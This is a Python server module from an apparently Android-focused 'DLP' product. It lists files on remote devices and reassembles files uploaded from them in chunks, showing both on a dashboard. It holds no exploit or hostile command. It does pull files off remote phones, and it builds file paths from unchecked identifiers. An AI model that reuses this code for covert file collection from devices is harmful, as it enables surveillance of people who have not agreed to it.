"""
ATHEX DLP Enterprise - Files Module
====================================
Processes file system data from Android devices.
"""

import json
import logging
import base64
import tempfile
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)


class FilesHandler:
    """Handles file system operations"""
    
    def __init__(self):
        self.cached_listings: Dict[str, List[Dict]] = {}
        self.download_buffers: Dict[str, Dict] = {}
        self.temp_dir = Path(tempfile.gettempdir()) / "athex_dlp_files"
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        logger.info("FilesHandler initialized")
    
    def process_listing(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process file listing from device.
        
        Args:
            session_id: Device session ID
            raw_data: Raw file listing data
            
        Returns:
            Processed file tree
        """
        try:
            if isinstance(raw_data, str):
                # Parse text format: TYPE|PATH|SIZE|MODIFIED
                lines = raw_data.strip().split('||')
                files = []
                
                for line in lines:
                    if not line.strip():
                        continue
                    
                    parts = line.split('|')
                    if len(parts) >= 4:
                        files.append({
                            "type": "directory" if parts[0] == "DIRECTORY" else "file",
                            "path": parts[1],
                            "name": Path(parts[1]).name,
                            "size": int(parts[2]) if parts[2].isdigit() else 0,
                            "modified": int(parts[3]) if parts[3].isdigit() else 0
                        })
            else:
                files = raw_data if isinstance(raw_data, list) else []
            
            # Build tree structure
            tree = self._build_tree(files)
            
            self.cached_listings[session_id] = tree
            
            logger.info(f"📁 Processed {len(files)} files from {session_id}")
            
            return {
                "success": True,
                "session_id": session_id,
                "files": tree,
                "count": len(files),
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error processing file listing: {e}")
            return {"success": False, "error": str(e)}
    
    def _build_tree(self, files: List[Dict]) -> List[Dict]:
        """Build hierarchical file tree"""
        tree = {}
        
        for file in files:
            path_parts = Path(file["path"]).parts
            current = tree
            
            # Navigate to parent directory
            for part in path_parts[:-1]:
                if part not in current:
                    current[part] = {"_children": {}, "_info": {"type": "directory", "name": part}}
                current = current[part]["_children"]
            
            # Add file
            filename = path_parts[-1]
            if file["type"] == "directory":
                if filename not in current:
                    current[filename] = {"_children": {}, "_info": file}
            else:
                current[filename] = {"_info": file}
        
        return self._convert_tree(tree)
    
    def _convert_tree(self, tree: Dict, parent_path: str = "") -> List[Dict]:
        """Convert tree dict to list format"""
        result = []
        
        for name, node in sorted(tree.items()):
            if name.startswith("_"):
                continue
            
            info = node.get("_info", {})
            item = {
                "name": name,
                "path": f"{parent_path}/{name}",
                "type": info.get("type", "file"),
                "size": info.get("size", 0),
                "size_formatted": self._format_size(info.get("size", 0)),
                "modified": info.get("modified", 0),
                "children": []
            }
            
            if item["type"] == "directory" and "_children" in node:
                item["children"] = self._convert_tree(
                    node["_children"], 
                    f"{parent_path}/{name}"
                )
            
            result.append(item)
        
        return result
    
    def process_file_chunk(self, session_id: str, data: str) -> Dict:
        """Process incoming file chunk"""
        try:
            parts = data.split('|', 3)
            if len(parts) < 4:
                return {"success": False, "error": "Invalid chunk format"}
            
            file_id = parts[0]
            chunk_index = int(parts[1])
            total_chunks = int(parts[2])
            chunk_data = base64.b64decode(parts[3])
            
            # Initialize buffer
            if file_id not in self.download_buffers:
                self.download_buffers[file_id] = {
                    "chunks": {},
                    "total_chunks": total_chunks,
                    "received": 0,
                    "started_at": datetime.now()
                }
            
            buffer = self.download_buffers[file_id]
            buffer["chunks"][chunk_index] = chunk_data
            buffer["received"] += 1
            
            # Check if complete
            if buffer["received"] >= buffer["total_chunks"]:
                return self._assemble_file(file_id)
            
            return {
                "success": True,
                "file_id": file_id,
                "progress": f"{buffer['received']}/{buffer['total_chunks']}",
                "percent": (buffer["received"] * 100) // buffer["total_chunks"]
            }
            
        except Exception as e:
            logger.error(f"Error processing file chunk: {e}")
            return {"success": False, "error": str(e)}
    
    def _assemble_file(self, file_id: str) -> Dict:
        """Assemble file from chunks"""
        buffer = self.download_buffers.get(file_id)
        if not buffer:
            return {"success": False, "error": "Buffer not found"}
        
        try:
            # Combine chunks in order
            file_data = b''
            for i in range(buffer["total_chunks"]):
                if i in buffer["chunks"]:
                    file_data += buffer["chunks"][i]
            
            # Save to temp file
            file_path = self.temp_dir / f"{file_id}.download"
            with open(file_path, 'wb') as f:
                f.write(file_data)
            
            # Clean buffer
            del self.download_buffers[file_id]
            
            logger.info(f"📥 File assembled: {file_path} ({len(file_data)} bytes)")
            
            return {
                "success": True,
                "file_id": file_id,
                "path": str(file_path),
                "size": len(file_data),
                "size_formatted": self._format_size(len(file_data))
            }
            
        except Exception as e:
            logger.error(f"Error assembling file: {e}")
            return {"success": False, "error": str(e)}
    
    def format_for_dashboard(self, files: List[Dict]) -> List[Dict]:
        """Format files for dashboard display"""
        dashboard = []
        
        for file in files[:100]:
            item = {
                "name": file.get("name", "Unknown"),
                "path": file.get("path", ""),
                "type": file.get("type", "file"),
                "size": file.get("size_formatted", "0 B"),
                "icon": self._get_file_icon(file.get("name", "")),
                "children": file.get("children", [])[:20] if file.get("children") else []
            }
            dashboard.append(item)
        
        return dashboard
    
    def _get_file_icon(self, filename: str) -> str:
        """Get emoji icon for file type"""
        ext = filename.lower().split('.')[-1] if '.' in filename else ''
        
        icons = {
            'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️',
            'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬',
            'mp3': '🎵', 'wav': '🎵', 'aac': '🎵',
            'pdf': '📕', 'doc': '📘', 'docx': '📘', 'txt': '📄',
            'apk': '📱', 'zip': '📦', 'rar': '📦',
            'db': '🗄️',
        }
        
        return icons.get(ext, '📄')
    
    def _format_size(self, size_bytes: int) -> str:
        """Format file size"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024
        return f"{size_bytes:.1f} PB"
    
    def get_download_path(self, file_id: str) -> Optional[Path]:
        """Get path of downloaded file"""
        file_path = self.temp_dir / f"{file_id}.download"
        if file_path.exists():
            return file_path
        return None


files_handler = FilesHandler()